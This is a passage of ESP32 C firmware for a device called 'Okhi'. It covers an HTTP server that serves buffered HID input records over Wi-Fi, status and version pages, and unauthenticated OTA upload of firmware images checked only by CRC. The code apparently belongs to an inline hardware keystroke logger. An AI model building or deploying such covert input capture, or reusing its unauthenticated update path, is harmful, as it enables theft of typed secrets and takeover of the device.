    if (header_len <= 0 || (size_t)header_len >= sizeof(conn->resp))
    {
        http_reply_text(conn, "500 Internal Server Error", "header too large\n");
        return;
    }

    conn->send_ptr = index_html_gz_start;
    conn->send_left = size;
    conn->resp_len = (size_t)header_len;
    conn->resp_sent = 0;
}

static bool http_path_is(const char *path, const char *target)
{
    size_t len = strlen(target);

    return strncmp(path, target, len) == 0 && (path[len] == '\0' || path[len] == '?');
}

static bool http_query_uint(const char *path, const char *key, uint32_t *value)
{
    const char *cursor = strchr(path, '?');
    if (cursor == NULL)
    {
        return false;
    }

    size_t key_len = strlen(key);
    cursor++;

    while (*cursor != '\0')
    {
        if (strncmp(cursor, key, key_len) == 0 && cursor[key_len] == '=')
        {
            *value = (uint32_t)strtoul(cursor + key_len + 1, NULL, 10);
            return true;
        }

        const char *next = strchr(cursor, '&');
        if (next == NULL)
        {
            return false;
        }

        cursor = next + 1;
    }

    return false;
}

static void route_buffer(http_conn_t *conn, const char *path)
{
    uint32_t head = hid_ring_head();
    uint32_t cursor = 0;

    bool stateless = http_query_uint(path, "from", &cursor);
    if (!stateless)
    {
        cursor = http_legacy_cursor;
    }

    uint32_t skipped = 0;
    cursor = hid_ring_clamp(cursor, head, &skipped);

    if (!stateless)
    {
        stats.ring_dropped += skipped;
    }

    size_t body_len = 0;
    hid_record_t record;

    while (cursor != head)
    {
        if (!hid_ring_read(cursor, &record))
        {
            break;
        }

        if (body_len + record.len > sizeof(http_body))
        {
            break;
        }

        memcpy(http_body + body_len, record.data, record.len);
        body_len += record.len;
        cursor++;
    }

    if (!stateless)
    {
        http_legacy_cursor = cursor;
    }

    char extra[160];
    snprintf(extra, sizeof(extra), "X-Okhi-Next: %u\r\nX-Okhi-Head: %u\r\nX-Okhi-Skipped: %u\r\n", (unsigned)cursor,
             (unsigned)head, (unsigned)skipped);

    if (body_len == 0)
    {
        http_reply_no_content(conn, extra);
        return;
    }

    http_reply(conn, "200 OK", HTTP_TEXT_PLAIN, extra, http_body, body_len);
}

static void route_esp(http_conn_t *conn)
{
    int len = snprintf(http_body, sizeof(http_body),
                       "records: 0x%x dropped: 0x%x truncated: 0x%x spi_err: 0x%x heap: %u",
                       (unsigned)stats.spi_records, (unsigned)stats.ring_dropped, (unsigned)stats.spi_truncated,
                       (unsigned)(stats.spi_errors + stats.spi_queue_errors), (unsigned)esp_get_free_heap_size());

    if (len <= 0)
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    if ((size_t)len >= sizeof(http_body))
    {
        len = (int)sizeof(http_body) - 1;
    }

    http_reply(conn, "200 OK", HTTP_TEXT_PLAIN, NULL, http_body, (size_t)len);
}

static void route_rp(http_conn_t *conn)
{
    char snapshot[RP_STATUS_MAX];

    rp_status_snapshot(snapshot, sizeof(snapshot));

    if (snapshot[0] == '\0')
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    http_reply_text(conn, "200 OK", snapshot);
}

static void hw_version_refresh(void)
{
    if (hw_version_known)
    {
        return;
    }

    char snapshot[RP_STATUS_MAX];

    rp_status_snapshot(snapshot, sizeof(snapshot));

    char *found = strstr(snapshot, "HWv");
    if (found == NULL)
    {
        return;
    }

    snprintf(hw_version, sizeof(hw_version), "%s", found + 2);

    size_t end = strcspn(hw_version, " \t\r\n");
    hw_version[end] = '\0';

    hw_version_known = end != 0;
}

static const char *rp_link_state(void)
{
    if (rp_frame_version == 0)
    {
        return "no rp seen";
    }

    uint32_t age = (uint32_t)(esp_timer_get_time() / 1000) - rp_last_seen_ms;

    if (age > RP_LINK_STALE_MS)
    {
        return "stale";
    }

    if (rp_frame_version != SPI_FRAME_VERSION)
    {
        return "protocol mismatch";
    }

    return "up";
}

static const char *rp_variant_name(void)
{
    const char *space = strchr(rp_identity, ' ');

    if (space == NULL)
    {
        return "";
    }

    if (strncmp(space + 1, OKHI_VARIANT_USB " ", 4) == 0)
    {
        return OKHI_VARIANT_USB;
    }

    if (strncmp(space + 1, OKHI_VARIANT_PS2 " ", 4) == 0)
    {
        return OKHI_VARIANT_PS2;
    }

    return "";
}

static const char *reset_reason_name(void)
{
    switch (esp_reset_reason())
    {
    case ESP_RST_POWERON:
        return "poweron";
    case ESP_RST_EXT:
        return "external pin";
    case ESP_RST_SW:
        return "software restart";
    case ESP_RST_PANIC:
        return "panic";
    case ESP_RST_INT_WDT:
        return "interrupt watchdog";
    case ESP_RST_TASK_WDT:
        return "task watchdog";
    case ESP_RST_WDT:
        return "other watchdog";
    case ESP_RST_DEEPSLEEP:
        return "deep sleep wake";
    case ESP_RST_BROWNOUT:
        return "brownout";
    case ESP_RST_SDIO:
        return "sdio";
    default:
        return "unknown";
    }
}

static const char *ota_stage_name(void)
{
    if (!ota_active)
    {
        return "idle";
    }

    switch (ota_stage)
    {
    case OTA_STAGE_HEADER:
        return "header";
    case OTA_STAGE_ESP:
        return "esp image";
    case OTA_STAGE_RP:
        return "rp image";
    default:
        return "done";
    }
}

static void route_hwver(http_conn_t *conn)
{
    hw_version_refresh();

    if (!hw_version_known)
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    http_reply_text(conn, "200 OK", hw_version);
}

static void route_versions(http_conn_t *conn)
{
    const esp_app_desc_t *description = esp_app_get_description();
    const esp_partition_t *running = esp_ota_get_running_partition();

    hw_version_refresh();

    int len = snprintf(http_body, sizeof(http_body),
                       "esp_version=%s\n"
                       "esp_variant=%s\n"
                       "esp_build=%s %s\n"
                       "esp_idf=%s\n"
                       "esp_partition=%s\n"
                       "rp_identity=%s\n"
                       "rp_variant=%s\n"
                       "rp_hardware=%s\n"
                       "esp_proto=%d\n"
                       "rp_proto=%d\n"
                       "link=%s\n",
                       FIRMV_STR, description->version, description->date, description->time, description->idf_ver,
                       running ? running->label : "unknown", rp_identity[0] ? rp_identity : "", rp_variant_name(),
                       hw_version_known ? hw_version : "", SPI_FRAME_VERSION, rp_frame_version,
                       rp_link_state());

    if (len <= 0)
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    if ((size_t)len >= sizeof(http_body))
    {
        len = (int)sizeof(http_body) - 1;
    }

    http_reply(conn, "200 OK", HTTP_TEXT_PLAIN, NULL, http_body, (size_t)len);
}

static void route_stats(http_conn_t *conn)
{
    static wifi_sta_list_t sta_list;

    memset(&sta_list, 0, sizeof(sta_list));
    esp_wifi_ap_get_sta_list(&sta_list);

    const esp_partition_t *running = esp_ota_get_running_partition();
    const esp_app_desc_t *description = esp_app_get_description();

    int len = snprintf(http_body, sizeof(http_body),
                       "firmware=%s\n"
                       "variant=%s\n"
                       "partition=%s\n"
                       "reset_reason=%s\n"
                       "pending_verify=%d\n"
                       "booted_pending=%d\n"
                       "uptime_s=%u\n"
                       "free_heap=%u\n"
                       "min_free_heap=%u\n"
                       "largest_free_block=%u\n"
                       "stations=%d\n"
                       "link=%s\n"
                       "rp_link_age_ms=%u\n"
                       "rp_variant=%s\n"
                       "rp_proto=%d\n"
                       "spi_transactions=%u\n"
                       "spi_records=%u\n"
                       "spi_empty=%u\n"
                       "spi_truncated=%u\n"
                       "spi_errors=%u\n"
                       "spi_queue_errors=%u\n"
                       "spi_polls=%u\n"
                       "spi_proto_mismatch=%u\n"
                       "spi_blocks_served=%u\n"
                       "rp_image_ready=%d\n"
                       "rp_image_size=%u\n"
                       "rp_image_crc=%08x\n"
                       "spi_last_record_bits=%u\n"
                       "spi_last_empty_bits=%u\n"
                       "spi_last_empty_head=%02x %02x %02x %02x %02x %02x %02x %02x\n"
                       "ring_entries=%u\n"
                       "ring_head=%u\n"
                       "ring_dropped=%u\n"
                       "http_requests=%u\n"
                       "http_rejected=%u\n"
                       "ota_stage=%s\n"
                       "ota_uploads_ok=%u\n"
                       "ota_uploads_failed=%u\n"
                       "ota_last_error=%s\n"
                       "rp_commit_pending=%d\n"
                       "rp_commit_completed=%d\n"
                       "esp_reboot_pending=%d\n",
                       FIRMV_STR, description->version, running ? running->label : "unknown", reset_reason_name(),
                       app_awaiting_validation ? 1 : 0, app_booted_pending ? 1 : 0,
                       (unsigned)(esp_timer_get_time() / 1000000),
                       (unsigned)esp_get_free_heap_size(),
                       (unsigned)esp_get_minimum_free_heap_size(),
                       (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_DEFAULT), sta_list.num,
                       rp_link_state(),
                       (unsigned)((uint32_t)(esp_timer_get_time() / 1000) - rp_last_seen_ms), rp_variant_name(),
                       rp_frame_version, (unsigned)stats.spi_transactions,
                       (unsigned)stats.spi_records, (unsigned)stats.spi_empty, (unsigned)stats.spi_truncated,
                       (unsigned)stats.spi_errors, (unsigned)stats.spi_queue_errors, (unsigned)stats.spi_polls,
                       (unsigned)stats.spi_proto_mismatch, (unsigned)spi_blocks_served, rp_image_ready ? 1 : 0,
                       (unsigned)rp_image_size, (unsigned)rp_image_crc,
                       (unsigned)spi_last_record_bits, (unsigned)spi_last_empty_bits, spi_last_empty_head[0],
                       spi_last_empty_head[1], spi_last_empty_head[2], spi_last_empty_head[3],
                       spi_last_empty_head[4], spi_last_empty_head[5], spi_last_empty_head[6],
                       spi_last_empty_head[7], (unsigned)RING_ENTRIES,
                       (unsigned)hid_ring_head(), (unsigned)stats.ring_dropped, (unsigned)stats.http_requests,
                       (unsigned)stats.http_rejected, ota_stage_name(), (unsigned)ota_uploads_ok,
                       (unsigned)ota_uploads_failed, ota_last_error, rp_commit_pending ? 1 : 0,
                       rp_commit_completed ? 1 : 0, ota_reboot_pending ? 1 : 0);

    if (len <= 0)
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    if ((size_t)len >= sizeof(http_body))
    {
        len = (int)sizeof(http_body) - 1;
    }

    http_reply(conn, "200 OK", HTTP_TEXT_PLAIN, NULL, http_body, (size_t)len);
}

static bool http_prefix_matches(const char *text, const char *prefix)
{
    while (*prefix != '\0')
    {
        char a = *text;
        char b = *prefix;

        if (a >= 'A' && a <= 'Z')
        {
            a = (char)(a + 32);
        }

        if (b >= 'A' && b <= 'Z')
        {
            b = (char)(b + 32);
        }

        if (a != b)
        {
            return false;
        }

        text++;
        prefix++;
    }

    return true;
}

static bool http_content_length(const char *request, size_t *value)
{
    const char *name = "content-length:";
    const char *cursor = strchr(request, '\n');

    while (cursor != NULL)
    {
        cursor++;

        if (http_prefix_matches(cursor, name))
        {
            cursor += strlen(name);

            while (*cursor == ' ' || *cursor == '\t')
            {
                cursor++;
            }

            *value = (size_t)strtoul(cursor, NULL, 10);
            return true;
        }

        cursor = strchr(cursor, '\n');
    }

    return false;
}

static bool http_expects_continue(const char *request)
{
    const char *cursor = strchr(request, '\n');

    while (cursor != NULL)
    {
        cursor++;

        if (http_prefix_matches(cursor, "expect:"))
        {
            return true;
        }

        cursor = strchr(cursor, '\n');
    }

    return false;
}

static void ota_reset_stream(void)
{
    ota_stage = OTA_STAGE_HEADER;
    ota_header_got = 0;
    ota_is_package = false;
    ota_esp_len = 0;
    ota_esp_crc = 0;
    ota_esp_got = 0;
    ota_esp_running = 0xffffffffu;
    ota_rp_len = 0;
    ota_rp_crc = 0;
    ota_rp_got = 0;
    ota_rp_running = 0xffffffffu;
    ota_esp_validated = false;
    ota_rp_validated = false;
}

static void ota_nvs_set_rp_pending(uint32_t size, uint32_t crc)
{
    nvs_handle_t handle;

    if (nvs_open(OTA_NVS_NAMESPACE, NVS_READWRITE, &handle) != ESP_OK)
    {
        return;
    }

    nvs_set_u32(handle, "rp_size", size);
    nvs_set_u32(handle, "rp_crc", crc);
    nvs_set_u32(handle, "rp_pending", 1);
    nvs_commit(handle);
    nvs_close(handle);
}

static void ota_nvs_clear_rp_pending(void)
{
    nvs_handle_t handle;

    if (nvs_open(OTA_NVS_NAMESPACE, NVS_READWRITE, &handle) != ESP_OK)
    {
        return;
    }

    nvs_set_u32(handle, "rp_pending", 0);
    nvs_commit(handle);
    nvs_close(handle);
}

static bool ota_nvs_get_rp_pending(uint32_t *size, uint32_t *crc)
{
    nvs_handle_t handle;
    uint32_t pending = 0;

    if (nvs_open(OTA_NVS_NAMESPACE, NVS_READONLY, &handle) != ESP_OK)
    {
        return false;
    }

    if (nvs_get_u32(handle, "rp_pending", &pending) != ESP_OK)
    {
        pending = 0;
    }

    if (pending != 0)
    {
        if (nvs_get_u32(handle, "rp_size", size) != ESP_OK || nvs_get_u32(handle, "rp_crc", crc) != ESP_OK)
        {
            pending = 0;
        }
    }

    nvs_close(handle);

    return pending != 0;
}

static void rp_image_restore_after_boot(void)
{
    struct stat info;
    uint32_t size = 0;
    uint32_t crc = 0;

    unlink(RP_IMAGE_TMP_PATH);

    if (!ota_nvs_get_rp_pending(&size, &crc))
    {
        return;
    }

    if (stat(RP_IMAGE_PATH, &info) != 0 || (uint32_t)info.st_size != size)
    {
        ESP_LOGW(TAG, "pending RP image is missing or truncated, dropping it");
        ota_nvs_clear_rp_pending();
        return;
    }

    int fd = open(RP_IMAGE_PATH, O_RDONLY);
    if (fd < 0)
    {
        ota_nvs_clear_rp_pending();
        return;
    }

    if (!rp_image_verify_on_disk(fd, size, crc))
    {
        ESP_LOGE(TAG, "pending RP image failed its crc on flash, dropping it");
        close(fd);
        unlink(RP_IMAGE_PATH);
        ota_nvs_clear_rp_pending();
        return;
    }

    rp_image_fd = fd;
    rp_image_size = size;
    rp_image_crc = crc;
    rp_window_offset = SPI_NO_BLOCK;
    spi_requested_block = SPI_NO_BLOCK;
    rp_commit_pending = true;
    __atomic_store_n(&rp_image_ready, true, __ATOMIC_SEQ_CST);

    ESP_LOGW(TAG, "RP update pending: %u bytes crc %08x", (unsigned)size, (unsigned)crc);
}

static void ota_fail(http_conn_t *conn, const char *reason)
{
    char body[160];

    ota_cleanup();

    snprintf(ota_last_error, sizeof(ota_last_error), "%s", reason);
    ota_uploads_failed++;

    ESP_LOGE(TAG, "OTA failed: %s", reason);
    snprintf(body, sizeof(body), "OTA failed: %s\n", reason);

    conn->state = HTTP_CONN_SEND;
    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_reply_text(conn, "500 Internal Server Error", body);
}

static bool ota_begin(http_conn_t *conn, size_t length)
{
    if (ota_active || rp_upload_fd >= 0)
    {
        ota_fail(conn, "another upload is already in progress");
        return false;
    }

    ota_partition = esp_ota_get_next_update_partition(NULL);
    if (ota_partition == NULL)
    {
        ota_fail(conn, "no OTA partition, this build uses the old single-slot table");
        return false;
    }

    if (length < OTA_PKG_HEADER_SIZE + 1)
    {
        ota_fail(conn, "upload is too small to be a firmware image or a package");
        return false;
    }

    ota_reset_stream();

    conn->body_expected = length;
    conn->body_received = 0;

    ESP_LOGI(TAG, "upload started, %u bytes", (unsigned)length);

    return true;
}

static bool ota_start_esp_image(http_conn_t *conn, uint32_t length)
{
    if (length < OTA_MIN_IMAGE_SIZE || length > ota_partition->size)
    {
        char reason[96];

        snprintf(reason, sizeof(reason), "esp image size %u out of range (%u..%u)", (unsigned)length,
                 (unsigned)OTA_MIN_IMAGE_SIZE, (unsigned)ota_partition->size);
        ota_fail(conn, reason);

        return false;
    }

    if (esp_ota_begin(ota_partition, length, &ota_handle) != ESP_OK)
    {
        ota_fail(conn, "esp_ota_begin failed");
        return false;
    }

    ota_active = true;
    ota_esp_len = length;
    ota_stage = OTA_STAGE_ESP;

    ESP_LOGI(TAG, "esp image %u bytes into %s", (unsigned)length, ota_partition->label);

    return true;
}

static bool ota_parse_package_header(http_conn_t *conn)
{
    if (memcmp(ota_header, "OKHI", 4) != 0)
    {
        ota_fail(conn, "not an okhi package and not a raw esp image");
        return false;
    }

    if (spi_get_u32(ota_header + 4) != OTA_PKG_FORMAT_VERSION)
    {
        ota_fail(conn, "unsupported package format version");
        return false;
    }

    if (crc32_buffer(ota_header, OTA_PKG_HEADER_SIZE - 4) != spi_get_u32(ota_header + 28))
    {
        ota_fail(conn, "package header crc mismatch");
        return false;
    }

    if (strncmp((const char *)(ota_header + 8), WIFI_PREFIX, 4) != 0)
    {
        ota_fail(conn, "package belongs to a different okhi variant");
        return false;
    }

    ota_esp_len = spi_get_u32(ota_header + 12);
    ota_esp_crc = spi_get_u32(ota_header + 16);
    ota_rp_len = spi_get_u32(ota_header + 20);
    ota_rp_crc = spi_get_u32(ota_header + 24);

    if (ota_rp_len > RP_IMAGE_MAX_SIZE)
    {
        ota_fail(conn, "rp image in the package is too large");
        return false;
    }

    if ((size_t)OTA_PKG_HEADER_SIZE + ota_esp_len + ota_rp_len != conn->body_expected)
    {
        ota_fail(conn, "package lengths do not add up to Content-Length");
        return false;
    }

    ota_is_package = true;

    ESP_LOGI(TAG, "package: esp %u bytes, rp %u bytes", (unsigned)ota_esp_len, (unsigned)ota_rp_len);

    return true;
}

static bool ota_open_rp_stage(http_conn_t *conn)
{
    rp_upload_fd = open(RP_IMAGE_TMP_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (rp_upload_fd < 0)
    {
        ota_fail(conn, "could not create " RP_IMAGE_TMP_PATH);
        return false;
    }

    ota_stage = OTA_STAGE_RP;

    return true;
}

static bool ota_finish_esp_image(http_conn_t *conn)
{
    esp_app_desc_t incoming;

    if (ota_is_package && (ota_esp_running ^ 0xffffffffu) != ota_esp_crc)
    {
        ota_fail(conn, "esp image crc does not match the package header");
        return false;
    }

    esp_err_t err = esp_ota_end(ota_handle);
    ota_active = false;

    if (err != ESP_OK)
    {
        ota_fail(conn, err == ESP_ERR_OTA_VALIDATE_FAILED ? "esp image failed validation" : "esp_ota_end failed");
        return false;
    }

    if (esp_ota_get_partition_description(ota_partition, &incoming) != ESP_OK)
    {
        ota_fail(conn, "could not read the app descriptor");
        return false;
    }

    const esp_app_desc_t *running = esp_app_get_description();

    if (strncmp(incoming.project_name, running->project_name, sizeof(incoming.project_name)) != 0 ||
        strncmp(incoming.version, running->version, sizeof(incoming.version)) != 0)
    {
        ota_fail(conn, "esp image belongs to a different okhi variant");
        return false;
    }

    ota_esp_validated = true;

    ESP_LOGW(TAG, "esp image validated, not committed yet");

    return true;
}

static bool ota_finish_rp_image(http_conn_t *conn)
{
    close(rp_upload_fd);
    rp_upload_fd = -1;

    if ((ota_rp_running ^ 0xffffffffu) != ota_rp_crc)
    {
        ota_fail(conn, "rp image crc does not match the package header");
        return false;
    }

    int fd = open(RP_IMAGE_TMP_PATH, O_RDONLY);
    if (fd < 0)
    {
        ota_fail(conn, "could not reopen the staged rp image");
        return false;
    }

    bool on_disk_ok = rp_image_verify_on_disk(fd, ota_rp_len, ota_rp_crc);
    close(fd);

    if (!on_disk_ok)
    {
        ota_fail(conn, "the staged rp image on flash does not match its crc");
        return false;
    }

    ota_rp_validated = true;

    ESP_LOGW(TAG, "rp image validated, %u bytes crc %08x", (unsigned)ota_rp_len, (unsigned)ota_rp_crc);

    return true;
}

static bool ota_publish_staged_rp_image(uint32_t size, uint32_t crc)
{
    rp_image_invalidate();
    ota_nvs_clear_rp_pending();

    unlink(RP_IMAGE_PATH);

    if (rename(RP_IMAGE_TMP_PATH, RP_IMAGE_PATH) != 0)
    {
        return false;
    }

    int fd = open(RP_IMAGE_PATH, O_RDONLY);
    if (fd < 0)
    {
        return false;
    }

    rp_image_fd = fd;
    rp_image_size = size;
    rp_image_crc = crc;
    rp_window_offset = SPI_NO_BLOCK;
    spi_requested_block = SPI_NO_BLOCK;

    __atomic_store_n(&rp_image_ready, true, __ATOMIC_SEQ_CST);

    return true;
}

static bool ota_commit_upload(http_conn_t *conn)
{
    if (ota_rp_validated && !ota_publish_staged_rp_image(ota_rp_len, ota_rp_crc))
    {
        ota_fail(conn, "could not put the verified rp image in place");
        return false;
    }

    if (ota_esp_validated && esp_ota_set_boot_partition(ota_partition) != ESP_OK)
    {
        ota_fail(conn, "could not set the boot partition");
        return false;
    }

    if (ota_rp_validated)
    {
        rp_commit_pending = true;
        ota_nvs_set_rp_pending(ota_rp_len, ota_rp_crc);
    }

    ota_reboot_pending = ota_esp_validated;

    return true;
}

static void ota_report_success(http_conn_t *conn)
{
    char body[256];

    if (!ota_commit_upload(conn))
    {
        return;
    }

    ota_uploads_ok++;
    ota_last_error[0] = '\0';

    if (ota_reboot_pending)
    {
        snprintf(body, sizeof(body),
                 "OK\nesp: %u bytes into %s\nrp: %u bytes staged\n"
                 "rebooting now, reconnect and load the page to confirm the update\n",
                 (unsigned)ota_esp_len, ota_partition ? ota_partition->label : "?", (unsigned)ota_rp_len);
    }
    else
    {
        snprintf(body, sizeof(body), "OK\nrp: %u bytes staged, the RP fetches and applies it shortly\n",
                 (unsigned)ota_rp_len);
    }

    ota_partition = NULL;

    conn->state = HTTP_CONN_SEND;
    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_reply_text(conn, "200 OK", body);
}

static void ota_consume(http_conn_t *conn, const uint8_t *data, size_t len)
{
    size_t remaining = conn->body_expected - conn->body_received;

    if (len > remaining)
    {
        len = remaining;
    }

    conn->body_received += len;

    while (len > 0 && ota_stage != OTA_STAGE_DONE)
    {
        if (ota_stage == OTA_STAGE_HEADER)
        {
            size_t want = OTA_PKG_HEADER_SIZE - ota_header_got;
            size_t take = len < want ? len : want;

            memcpy(ota_header + ota_header_got, data, take);
            ota_header_got += take;
            data += take;
            len -= take;

            if (ota_header_got >= 4 && ota_header[0] == 0xE9)
            {
                if (!ota_start_esp_image(conn, (uint32_t)conn->body_expected))
                {
                    return;
                }

                if (esp_ota_write(ota_handle, ota_header, ota_header_got) != ESP_OK)
                {
                    ota_fail(conn, "esp_ota_write failed");
                    return;
                }

                ota_esp_got = (uint32_t)ota_header_got;
                continue;
            }

            if (ota_header_got < OTA_PKG_HEADER_SIZE)
            {
                return;
            }

            if (!ota_parse_package_header(conn))
            {
                return;
            }

            if (ota_esp_len > 0)
            {
                if (!ota_start_esp_image(conn, ota_esp_len))
                {
                    return;
                }
            }
            else if (ota_rp_len > 0)
            {
                if (!ota_open_rp_stage(conn))
                {
                    return;
                }
            }
            else
            {
                ota_fail(conn, "package carries no images");
                return;
            }

            continue;
        }

        if (ota_stage == OTA_STAGE_ESP)
        {
            size_t want = ota_esp_len - ota_esp_got;
            size_t take = len < want ? len : want;

            if (esp_ota_write(ota_handle, data, take) != ESP_OK)
            {
                ota_fail(conn, "esp_ota_write failed");
                return;
            }

            ota_esp_running = crc32_update(ota_esp_running, data, take);
            ota_esp_got += (uint32_t)take;
            data += take;
            len -= take;

            if (ota_esp_got < ota_esp_len)
            {
                return;
            }

            if (!ota_finish_esp_image(conn))
            {
                return;
            }

            if (ota_is_package && ota_rp_len > 0)
            {
                if (!ota_open_rp_stage(conn))
                {
                    return;
                }

                continue;
            }

            ota_stage = OTA_STAGE_DONE;
            continue;
        }

        size_t want = ota_rp_len - ota_rp_got;
        size_t take = len < want ? len : want;

        if (write(rp_upload_fd, data, take) != (int)take)
        {
            ota_fail(conn, "write to SPIFFS failed");
            return;
        }

        ota_rp_running = crc32_update(ota_rp_running, data, take);
        ota_rp_got += (uint32_t)take;
        data += take;
        len -= take;

        if (ota_rp_got < ota_rp_len)
        {
            return;
        }

        if (!ota_finish_rp_image(conn))
        {
            return;
        }

        ota_stage = OTA_STAGE_DONE;
    }

    if (conn->body_received < conn->body_expected)
    {
        return;
    }

    if (ota_stage == OTA_STAGE_DONE)
    {
        ota_report_success(conn);
    }
    else
    {
        ota_fail(conn, "the upload ended before every image was received");
    }
}

static void route_spibench(http_conn_t *conn, const char *path)
{
    uint32_t duration = 3000;
    char body[128];

    http_query_uint(path, "ms", &duration);

    if (duration < 100 || duration > 20000)
    {
        http_reply_text(conn, "400 Bad Request", "ms must be between 100 and 20000\n");
        return;
    }

    spi_bench_ms = duration;
    spi_bench_frames_left = SPI_BENCH_ARM_FRAMES;

    snprintf(body, sizeof(body), "benchmark armed for %u ms, the RP picks it up within 500 ms\n",
             (unsigned)duration);
    http_reply_text(conn, "200 OK", body);
}

static void rp_upload_fail(http_conn_t *conn, const char *reason)
{
    char body[176];

    rp_upload_cleanup();
    rp_image_invalidate();

    ESP_LOGE(TAG, "RP image upload failed: %s", reason);
    snprintf(body, sizeof(body), "RP image upload failed: %s\n", reason);

    conn->state = HTTP_CONN_SEND;
    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_reply_text(conn, "500 Internal Server Error", body);
}

static bool rp_upload_begin(http_conn_t *conn, size_t length)
{
    if (rp_upload_fd >= 0)
    {
        rp_upload_fail(conn, "another upload is already in progress");
        return false;
    }

    if (length == 0 || length > RP_IMAGE_MAX_SIZE)
    {
        char reason[128];

        snprintf(reason, sizeof(reason), "size %u out of range (1..%u), nothing was changed\n", (unsigned)length,
                 (unsigned)RP_IMAGE_MAX_SIZE);

        conn->state = HTTP_CONN_SEND;
        conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
        http_reply_text(conn, "400 Bad Request", reason);

        return false;
    }

    rp_upload_fd = open(RP_IMAGE_TMP_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (rp_upload_fd < 0)
    {
        rp_upload_fail(conn, "could not create " RP_IMAGE_TMP_PATH);
        return false;
    }

    rp_upload_crc = 0xFFFFFFFFu;
    conn->body_expected = length;
    conn->body_received = 0;

    ESP_LOGI(TAG, "RP image upload started, %u bytes", (unsigned)length);

    return true;
}

static void rp_upload_finish(http_conn_t *conn)
{
    char body[192];

    close(rp_upload_fd);
    rp_upload_fd = -1;

    uint32_t staged_size = (uint32_t)conn->body_received;
    uint32_t staged_crc = rp_upload_crc ^ 0xFFFFFFFFu;

    int fd = open(RP_IMAGE_TMP_PATH, O_RDONLY);
    if (fd < 0)
    {
        rp_upload_fail(conn, "could not reopen the staged image");
        return;
    }

    bool on_disk_ok = rp_image_verify_on_disk(fd, staged_size, staged_crc);
    close(fd);

    if (!on_disk_ok)
    {
        rp_upload_fail(conn, "the staged image on flash does not match its crc");
        return;
    }

    if (!ota_publish_staged_rp_image(staged_size, staged_crc))
    {
        rp_upload_fail(conn, "could not put the verified image in place");
        return;
    }

    snprintf(body, sizeof(body), "RP image staged\nsize: %u bytes\ncrc32: %08x\nblocks: %u\n",
             (unsigned)rp_image_size, (unsigned)rp_image_crc,
             (unsigned)((rp_image_size + SPI_BLOCK_PAYLOAD - 1) / SPI_BLOCK_PAYLOAD));

    ESP_LOGI(TAG, "RP image staged, %u bytes crc %08x", (unsigned)rp_image_size, (unsigned)rp_image_crc);

    conn->state = HTTP_CONN_SEND;
    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_reply_text(conn, "200 OK", body);
}

static void rp_upload_consume(http_conn_t *conn, const uint8_t *data, size_t len)
{
    size_t remaining = conn->body_expected - conn->body_received;

    if (len > remaining)
    {
        len = remaining;
    }

    if (len > 0)
    {
        if (write(rp_upload_fd, data, len) != (int)len)
        {
            rp_upload_fail(conn, "write to SPIFFS failed");
            return;
        }

        rp_upload_crc = crc32_update(rp_upload_crc, data, len);
    }

    conn->body_received += len;

    if (conn->body_received >= conn->body_expected)
    {
        rp_upload_finish(conn);
    }
}

static void http_body_consume(http_conn_t *conn, const uint8_t *data, size_t len)
{
    if (conn->body_sink == HTTP_BODY_OTA)
    {
        ota_consume(conn, data, len);
    }
    else
    {
        rp_upload_consume(conn, data, len);
    }
}

static void http_body_fail(http_conn_t *conn, const char *reason)
{
    if (conn->body_sink == HTTP_BODY_OTA)
    {
        ota_fail(conn, reason);
    }
    else
    {
        rp_upload_fail(conn, reason);
    }
}

static void http_dispatch(http_conn_t *conn, const char *body, size_t body_len)
{
    char method[8] = {0};
    char path[HTTP_PATH_MAX] = {0};

    stats.http_requests++;
    app_validation_confirm();

    conn->state = HTTP_CONN_SEND;

    if (sscanf(conn->req, "%7s %127s", method, path) != 2)
    {
        http_reply_text(conn, "400 Bad Request", "bad request\n");
        return;
    }

    ESP_LOGI(HTTP_TAG, "%s %s", method, path);

    if (strcmp(method, "POST") == 0)
    {
        size_t length = 0;
        bool is_ota = http_path_is(path, "/ota");
        bool is_rp_image = http_path_is(path, "/rpimage");

        if (!is_ota && !is_rp_image)
        {
            http_reply_text(conn, "404 Not Found", "no such endpoint\n");
            return;
        }

        if (!http_content_length(conn->req, &length))
        {
            http_reply_text(conn, "411 Length Required", "Content-Length is required\n");
            return;
        }

        if (upload_owner != NULL && upload_owner != conn)
        {
            http_reply_text(conn, "409 Conflict", "another upload is already in progress\n");
            return;
        }

        if (ota_reboot_pending)
        {
            http_reply_text(conn, "409 Conflict", "an update is already committed, the device is rebooting\n");
            return;
        }

        conn->body_sink = is_ota ? HTTP_BODY_OTA : HTTP_BODY_RPIMAGE;
        upload_owner = conn;

        if (is_ota ? !ota_begin(conn, length) : !rp_upload_begin(conn, length))
        {
            return;
        }

        conn->state = HTTP_CONN_BODY;

        if (http_expects_continue(conn->req))
        {
            const char *interim = "HTTP/1.1 100 Continue\r\n\r\n";

            send(conn->fd, interim, strlen(interim), 0);
        }

        http_body_consume(conn, (const uint8_t *)body, body_len);

        return;
    }

    if (strcmp(method, "GET") != 0)
    {
        http_reply_text(conn, "405 Method Not Allowed", "only GET and POST are supported\n");
        return;
    }

    if (http_path_is(path, "/"))
    {
        http_reply_index(conn);
    }
    else if (http_path_is(path, "/buffer"))
    {
        route_buffer(conn, path);
    }
    else if (http_path_is(path, "/esp"))
    {
        route_esp(conn);
    }
    else if (http_path_is(path, "/rp"))
    {
        route_rp(conn);
    }
    else if (http_path_is(path, "/ver"))
    {
        http_reply_text(conn, "200 OK", FIRMV_STR);
    }
    else if (http_path_is(path, "/hwver"))
    {
        route_hwver(conn);
    }
    else if (http_path_is(path, "/stats"))
    {
        route_stats(conn);
    }
    else if (http_path_is(path, "/versions"))
    {
        route_versions(conn);
    }
    else if (http_path_is(path, "/spibench"))
    {
        route_spibench(conn, path);
    }
